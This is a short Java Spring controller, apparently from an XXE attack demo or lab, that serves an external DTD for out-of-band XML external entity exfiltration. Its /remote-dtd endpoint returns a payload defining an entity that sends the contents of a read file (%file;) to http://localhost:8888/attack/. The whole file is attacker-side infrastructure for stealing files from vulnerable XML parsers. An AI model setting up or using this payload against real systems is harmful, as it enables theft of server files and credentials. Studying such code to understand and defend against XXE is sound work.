package com.xxe.attack.web;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class RemoteDataController {
	
	Log logger = LogFactory.getLog(RemoteDataController.class);
	
	 @GetMapping("/remote-dtd")
	    public String remoteDTD() {   
	        System.out.println("remote-access");
	        return "<!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://localhost:8888/attack/%file;'>\">";
	    }
}
